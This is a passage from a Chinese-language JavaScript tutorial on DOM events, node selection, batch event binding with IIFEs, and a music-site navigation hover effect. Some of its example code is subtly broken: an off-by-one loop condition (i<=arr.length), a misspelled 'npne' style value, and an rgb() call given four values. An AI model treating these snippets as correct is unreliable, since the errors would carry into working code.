class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 获取节点</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> div=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;no1&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 添加事件</span></span></span><br><span class="line"><span class="language-javascript">	div.<span class="property">onmouseenter</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		div.<span class="property">style</span>.<span class="property">border</span>=<span class="string">&quot;1px solid red&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// div 元素的 border 样式属性</span></span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	div.<span class="property">onmouseleave</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		div.<span class="property">style</span>.<span class="property">border</span>=<span class="string">&quot;1px solid blue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="onfouse-和-onblur"><a href="#onfouse-和-onblur" class="headerlink" title="onfouse 和 onblur"></a>onfouse 和 onblur</h5><p>概述：可以给任意元素绑定，但是一般与表单元素 input 使用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			请您输入您的手机号：</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;cur&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;phone&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 获取节点</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> input=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;cur&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> span=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phone&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 绑定聚焦事件</span></span></span><br><span class="line"><span class="language-javascript">	input.<span class="property">onfocus</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 文字颜色为绿色</span></span></span><br><span class="line"><span class="language-javascript">		input.<span class="property">style</span>.<span class="property">color</span>=<span class="string">&quot;green&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	input.<span class="property">onblur</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 获取文本框中的文本</span></span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> txt=input.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 正则表达：验证字符串是不是手机格式</span></span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">if</span>(<span class="regexp">/^1[3456789]\d&#123;9&#125;/</span>.<span class="title function_">test</span>(txt))&#123;</span></span><br><span class="line"><span class="language-javascript">			span.<span class="property">innerHTML</span>=<span class="string">&quot;是手机格式&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">		&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">			span.<span class="property">innerHTML</span>=<span class="string">&quot;不是手机格式&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="鼠标系列的事件"><a href="#鼠标系列的事件" class="headerlink" title="鼠标系列的事件"></a>鼠标系列的事件</h5><p>概述：我们可以给任意节点绑定鼠标系列事件</p>
<ul>
<li><p>onmousedown：鼠标按下事件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="property">onmousedown</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">background</span>=<span class="string">&quot;red&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在文档中注册了一个<code>mousedown</code>事件处理函数。当用户在文档中按下鼠标按钮时，该事件处理函数会被触发。在函数内部，它将文档的<code>body</code>元素的背景色设置为红色，以此来改变页面的背景色。换句话说，当用户按下鼠标按钮时，页面的背景色会变为红色。</p>
</li>
<li><p>onmousemove：鼠标移动事件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="property">onmousemove</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> R=<span class="built_in">parseInt</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">255</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> G=<span class="built_in">parseInt</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">255</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> B=<span class="built_in">parseInt</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">255</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">background</span>=<span class="string">&quot;rgb(&quot;</span>+R+<span class="string">&quot;,&quot;</span>+G+<span class="string">&quot;,&quot;</span>+B+<span class="string">&quot;)&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在文档中注册了一个<code>mousemove</code>事件处理函数。当鼠标在文档中移动时，该事件处理函数会被触发。在函数内部，首先生成三个随机数<code>R</code>、<code>G</code>、<code>B</code>，分别代表红、绿、蓝三个颜色通道的值，范围在0到255之间。然后，使用这些随机生成的颜色值，通过<code>rgb()</code>函数将它们组合成一个RGB颜色值，最终将这个颜色值应用到文档的<code>body</code>元素的背景色上，使得页面背景色随着鼠标的移动而随机改变。</p>
</li>
<li><p>onmouseup：鼠标抬起事件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="property">onmouseup</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">background</span>=<span class="string">&quot;white&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在文档中注册了一个<code>mouseup</code>事件处理函数。当用户在文档中释放鼠标按钮时，该事件处理函数会被触发。在函数内部，它将文档的<code>body</code>元素的背景色设置为白色，以此来改变页面的背景色。换句话说，当用户释放鼠标按钮时，页面的背景色会变为白色。</p>
</li>
</ul>
<h4 id="获取节点的其他方法"><a href="#获取节点的其他方法" class="headerlink" title="获取节点的其他方法"></a>获取节点的其他方法</h4><p>概述：DOM对象给我们提供了很多方法来获取节点，方法如下：</p>
<ul>
<li><p>getElementById：通过节点的ID属性值获取节点</p>
</li>
<li><p>getElementsByTagName：通过标签名字获取节点，此方法返回的是一个数组，数组里面就是节点</p>
</li>
<li><p>getElementsByClassName：通过标签的 class 属性值获取相应的节点，返回的是数组，数组里面是节点</p>
</li>
<li><p>querySelector：通过任意的选择获取某一个节点</p>
</li>
</ul>
<p>示例1：通过 getElementsByTagName 获取节点，将偶数个 li 标签中的内容变为蓝色</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 1 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 2 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 3 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 4 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 5 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 6 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 7 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span> 8 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> arr=<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;=arr.<span class="property">length</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			arr[i].<span class="property">style</span>.<span class="property">color</span>=<span class="string">&quot;blue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>getElementsByTagName 和方法通过标签名字获取全部节点</p>
</li>
<li><p>getElementsByClassName 和 getElementsByTagName 这两个方法返回的是一个类数组（类数组只能使用 length 方法），数组里面的元素才是节点</p>
</li>
<li><p>标签才可以设置样式，数组不能设置</p>
</li>
<li><p>不管节点嵌套多复杂都可以获取节点</p>
</li>
<li><p>querySelector 可以通过热议选择器（标签、id、类、并集、交集等）只能获取页面从上往下的第一个符合的节点</p>
</li>
</ul>
<h4 id="批量添加事件"><a href="#批量添加事件" class="headerlink" title="批量添加事件"></a>批量添加事件</h4><p>概述：在一些特定的场景下，有很多相同的节点，需要添加相同的事件</p>
<p>示例：单击文字变为红色</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        *&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">ul</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>:<span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 去除每行的项目符号 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>:<span class="number">60px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>:<span class="number">#eee</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 浮动 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 页边距 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>学习<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>娱乐<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>歌曲<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>文化<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>历史<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 批量添加事件：1、获取全部节点；2、循环语句遍历数组，给数组里面每一个元素绑定事件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> liArr =<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;liArr.<span class="property">length</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">        +<span class="keyword">function</span>(<span class="params">index</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 在每一个 IIFE 作用域里面给元素绑定单击事件</span></span></span><br><span class="line"><span class="language-javascript">            liArr[index].<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="comment">// 单击的时候触发事件处理函数</span></span></span><br><span class="line"><span class="language-javascript">                liArr[index].<span class="property">style</span>.<span class="property">color</span>=<span class="string">&quot;red&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;(i);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>IIFE 在声明表达式形式的函数的同时执行一次</p>
</li>
<li><p>上面代码中，若不加 IIFE 直接在循环语句里面嵌套事件处理函数的话，因为我们的元素绑定事件里面的函数需要触发才会执行，但是外层的循环是要进行完的，所以执行完循环语句代码之后，i 就等于 5 了，相当于全局变量 i 等于 5，而此时触发事件的话，事件处理函数会沿着作用域链去找i的值，而此时 i 等于 5，且一直都等于 5</p>
</li>
<li><p>所以，需要在 for 循环里面添加一个 IIFE（套在事件处理函数的外层），且每次循环都创建一个 IIFE，此时事件处理函数执行的时候，i 传递的就不是全局变量的i，找到的是每一个独立的 IIFE 的作用域中的 i</p>
</li>
</ul>
<h4 id="函数的上下文-this"><a href="#函数的上下文-this" class="headerlink" title="函数的上下文 this"></a>函数的上下文 this</h4><p>概述：在函数的函数体中是有函数的上下文 this 概念。当用户触发了元素事件的时候，函数的上下文即触发的元素</p>
<p>例如上节中批量添加事件的案例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> liArr=<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;liArr.<span class="property">length</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">    	liArr[i].<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        	<span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&quot;red&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    	&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="网易云音乐效果"><a href="#网易云音乐效果" class="headerlink" title="网易云音乐效果"></a>网易云音乐效果</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        *&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>:<span class="number">100%</span> ;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">60px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>:<span class="number">#c20c0c</span> ;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">ul</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>:<span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">60%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">60px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>:center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span> 推荐 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span> 排行榜 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span> 歌单 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span> 主播电台 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span> 歌手 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span> 新碟上架 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取全部节点</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> arr=<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 批量添加事件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.<span class="property">length</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">        +<span class="keyword">function</span>(<span class="params">index</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 每一个节点绑定鼠标移上事件</span></span></span><br><span class="line"><span class="language-javascript">            arr[index].<span class="property">onmouseenter</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="comment">// 当鼠标移上某一个节点得时候</span></span></span><br><span class="line"><span class="language-javascript">				<span class="comment">// 将全部 li 节点样式恢复成起始状态一致</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;arr.<span class="property">length</span>;j++)&#123;</span></span><br><span class="line"><span class="language-javascript">                    arr[j].<span class="property">style</span>.<span class="property">background</span>=<span class="string">&quot;#c20c0c&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                    arr[j].<span class="property">style</span>.<span class="property">borderRadius</span>=<span class="string">&quot;none&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">				<span class="comment">// 当前鼠标移上得节点样式进行修改</span></span></span><br><span class="line"><span class="language-javascript">                arr[index].<span class="property">style</span>.<span class="property">background</span>=<span class="string">&quot;rgb(0,0,0,0.3)&quot;</span> ;</span></span><br><span class="line"><span class="language-javascript">                arr[index].<span class="property">style</span>.<span class="property">borderRadius</span>=<span class="string">&quot;10px 10px 10px 10px&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            arr[index].<span class="property">onmouseleave</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="comment">// 当鼠标移下某一个节点得时候，将全部li节点样式恢复成和起始样式一致</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;arr.<span class="property">length</span>;j++)&#123;</span></span><br><span class="line"><span class="language-javascript">                    arr[j].<span class="property">style</span>.<span class="property">background</span>=<span class="string">&quot;#c20c0c&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                    arr[j].<span class="property">style</span>.<span class="property">borderRadius</span>=<span class="string">&quot;npne&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;(i)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/11/VAtaZCFswDWrvhR.png" alt="image-20240411231222548"></p>
